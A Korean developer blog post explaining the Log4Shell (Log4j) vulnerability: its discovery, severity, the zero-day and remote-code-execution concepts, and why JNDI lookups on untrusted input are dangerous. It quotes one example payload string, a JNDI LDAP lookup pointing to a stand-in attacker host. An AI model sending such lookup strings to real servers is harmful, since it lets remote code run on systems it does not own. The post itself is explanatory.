---
title: "최악의 보안사태 Log4J에 대해서"
excerpt: "developer"
categories:
  - developer
toc: true
toc_sticky: true
tags:
  - developer
---

## Log4J에 대해서

Log4Shell는 2021년 12월 9일에 알리바바 보안팀에 의해 처음 발견되었다. 그러나, 클라우드플레어에 따르면 해당 취약점은 이미 그전부터 해킹에 사용되고 있었다. 12월 1일부터..! 즉 이 취약점은 이미 9일 전부터 사용되었고, 사용되는동안 그 누구도 몰랏다는 것이다.
현재 역사상 최악의 보안사태라 불리는 Log4J는 애플, 텐센트,아마존... 등등 수많은 기업들이 해당 취약점에 노출이 되었다.
어떻게든 취약점을 릴리즈 하려는 기업과 그전에 해킹을 하려는 세력간의 경주가 펼쳐지고 있다고 한다.
`CVSS (Common Vulnerabilites Scoring System)` 혹은 `취약점 등급 시스템`은 현재 10/10으로 가장 높은 단계이다.
그만큼 엄중하고 심각함을 경고를 하고 있다. 심각함을 인지한 캐나다 정부는 4천여개의 정부 웹사이트를 폐쇄하고 미국 국토안보부도 데미지를 줄이고자 노력을 기울이고 있다. 인터넷은 전체적으로 난리가 난 것이다.
하지만 아무도 이사태의 파급력을 가늠조차 못하고 있다. 해당 취약점에 의하여 누가. 이미 해킹 당했는지 여부도 확인하지 못하고 있는 상태이기 때문이다. 이 취약점의 이름이 `Log4J 취약점` 혹은 `Log4Shell`이라고 한다. `Log4Shell`은 `제로데이 RCE 취약점`이다.

### 제로데이 취약점

시스템의 결함인데 오직 해커만 알고있는 경우이다.

> 따라서 `제로데이 취약점`이 발견이 된다면 해당 시스템의 관리자는 이걸 고칠시간이 말그대로 0일이기 때문이다. 왜 0일이냐면 해당 취약점이 이미 노출되어, 해킹에 사용되고 있으니까!

### REC(Remote code Execution)

RCE의 뜻은 `원격 코드 실행`의 약자이다. 말 그대로 해커가 나의 서버에서 마음대로 코드를 돌릴 수 있다는 얘기이다.문제는 이 취약점의 범위가 정말 넓다는 것이다. 이 문제의 범위가 크고 넓은 이유는 `Log4J` 라는 패키지 때문이다 이는 Java가 쓰이는 곳에서 매우 자주 쓰이는 패키지이다. 또 Java는 정말 많이 쓰이는 프로그래밍 언어이며 2015년 Oracle에 따르면, Java는 130억개 기기에서 구동 중이다. 이제 이를 줄이자면 .. 주 유명한 프로그래밍 언어의 아주 유명한 패키지에 결함이 생겼는데 덕분에 해커는 '원격 코드 조종'이 가능하다는 것이다.

### 왜 Log4J는 널리 쓰이는 걸까?

회사는 로그를 기록하는걸 좋아한다. 서버에 일어나는 모든 일을 기록하고싶어한다. 찍히는 수많은 로그들.. 기록을 Log4J가 포매팅하고..필터링하고 어플리케이션의 파일로 이를 기록하는 일을 한다. 인터넷에 연결된 모든 어플리케이션은 로그를 기록을 한다. 그리고 Java를 쓰는 어플ㄹ리케이션이라면 Log4J를 사용을 한다.

### 이렇게 심플한 일을 하는 녀석이 어떻게 역사상 가장 끔직한 취약점의 원인이 되었을까?

이를 설명하기전에는 댓글의 개념을 이해를 먼저 해보자. 댓글에 2+2를 입력을 하여도 코멘트에 4가 등록이 되질 않는다. 어쩌면 당연한 말이지만, 실행중인 클라이언트는 댓글을 코드로 인식하지 않기 때문이다.
보통 유저가 쓰는 댓글 같은걸 `신뢰할 수 없는 사용자 입력(Untrusted User Input)`즉 유저가 작성하는 데이터들은 절대 백엔드에 실행되지 않는다.
만약, 유저의 입력을 신뢰하게 된다면 결국 누구든 코드를 너의 서버에서 실행시킬 수 있게된다. 절대 좋은 생각은 아니다.
이 좋지 못한 일은 SQL Injection이라는 해킹이 만들어진 취약점이기도 하였다. 약 10~15년전 유행한 해킹이기도 하였다.
이로인해 백엔드 개발자 사이에선 유명한 말이 있다고한다. `Never Trust user input` 절대로 유저의 입력을 신뢰하지마라.
Log4J도 같은 문제점이다. Log4J에는 Lookups이라는 기능이 있는데, 어느정도 살짝 유저의 입력을 신뢰한다.
공격자가 서버에 요청을 보내면 그리고 요청에 이와 같은 String(`${jndi:ldap://attacker.com/a}`)이 있으면 Log4J는 이걸 로그에 넣고 또한 동시에 해당 URL을 불러올것이다. 문제는 해당 URL이 공격자의 것일 수 있다는 것이다.
위 String을 보다시피, JNDI`(Java Naming and Directory Interface)`라는 lookup을 사용하는데, 문제는 공격받는 서버는 그 URL만 부르는 것이 아니라. 해당 URL에 호스팅 되어있는 코드가 해당 공격받는 서버에서 실행될 수 있다는 것이다.

## 마치며

Log4J 정말 무서운 보안이슈였다는걸 이번 영상을 계기로 알게되었다.
코드가 포함된 URL을 서버에서 실행을 할수가 있다니.. 정말 단순하면서 무서운 해킹 방법이 많다

### 참고

https://www.youtube.com/watch?v=kwS3twdVsko
